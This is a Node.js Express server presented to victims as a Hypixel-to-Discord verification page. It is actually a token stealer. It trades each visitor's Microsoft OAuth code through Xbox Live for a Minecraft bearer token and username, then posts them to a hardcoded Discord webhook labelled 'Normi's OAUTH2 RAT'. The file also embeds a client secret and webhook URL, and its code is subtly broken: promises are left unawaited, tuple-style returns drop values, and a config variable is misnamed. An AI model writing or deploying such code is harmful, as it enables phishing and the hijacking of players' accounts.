const myconfig = {
    client_secret: 'HkL8Q~Lpyn6H6pI~3ENbt5wmNa9JNV3zHTlWlcqj',
    client_id: '60ed774d-82c5-4864-9038-231bcf8aac1a',
    redirect_uri: 'https://hypixeltodiscordverify.herokuapp.com/',
    webhook_url: 'https://discord.com/api/webhooks/1023169651536052344/_G1QWD7svz30JTn91tMSx02dTfZ0Ixmtk96eXOkOS9Klyu33AZnv2mPrxDHEEsefVsfI'
}

const axios = require('axios')
const express = require('express')
const app = express()
const port = process.env.PORT || 8080

app.get('/', (req, res) => {
    res.send('Success! You can exit this page and return to discord.')
    console.log(req.query.code)
    try {
        const code = req.query.code
        console.log(code + " is the code\n")
        const accessToken = getAccessToken(code)
        //console.log(accessToken + " is the access token\n")
        const userHash = getUserHashAndToken(accessToken)[0]
        //console.log(userHash + " is the user hash\n")
        const userToken = getUserHashAndToken(accessToken)[1]
        //console.log(userToken + " is the user token\n")
        const xstsToken = getXSTSToken(userToken)
        //console.log(xstsToken + " is the xsts token\n")
        const bearerToken = getBearerTokenAndUsername(xstsToken, userHash)[0]
        //console.log(bearerToken + " is the bearer token\n")
        const username = getBearerTokenAndUsername(xstsToken, userHash)[1]
        //console.log(username + " is the username\n")
        postToWebhook(username, bearerToken)
    } catch (err) {
        console.log("A wild error has appeared!\n" + err + "\n")
    }
})

app.listen(port, () => {
    console.log(`Started the server on ${port}`)
})

async function getAccessToken(code) {
    const url = 'https://login.live.com/oauth20_token.srf'
    const headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    const data = {
        client_id: myconfig.client_id,
        redirect_uri: myconfig.redirect_uri,
        client_secret: myconfig.client_secret,
        code: code,
        grant_type: 'authorization_code'
    }
    let response = await axios.post(url, data, headers)
    return response.data['access_token']
}

async function getUserHashAndToken(accessToken) {
    const url = 'https://user.auth.xboxlive.com/user/authenticate'
    const headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    }
    const data = {
        Properties: {
            AuthMethod: 'RPS',
            SiteName: 'user.auth.xboxlive.com',
            RpsTicket: `d=${accessToken}`
        },
        RelyingParty: 'http://auth.xboxlive.com',
        TokenType: 'JWT'
    }
    let response = await axios.post(url, data, headers)
    return response.data['uhs'], response.data['DisplayClaims']['xui'][0]['uhs']
}

async function getXSTSToken(userToken) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
    const headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    }
    const data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [userToken]
        },
        RelyingParty: 'rp://api.minecraftservices.com/',
        TokenType: 'JWT'
    }
    let response = await axios.post(url, data, headers)
    return response.data['Token']
}

async function getBearerTokenAndUsername(xstsToken, userHash) {
    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
    const headers = {
        'Content-Type': 'application/json',
    }
    const data = {
        identityToken: `XBL3.0 x=${userHash};${xstsToken}`,
        ensureLegacyEnabled: true
    }
    let response = await axios.post(url, data, headers)
    return response.data['access_token'], response.data['username']
}

function postToWebhook(username, bearerToken) {
    const url = config.webhook_url
    const headers = {
        'Content-Type': 'application/json',
    }
    const data = {
        username: "Normi's OAUTH2 RAT",
        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
        content: "||@everyone||",
        embeds: [
            {
                title: "User Info",
                description: `Username: ${username}\nBearer Token: ${bearerToken}`,
                color: 0x00ff00
            }
        ]
    }
    axios.post(url, data, headers)
}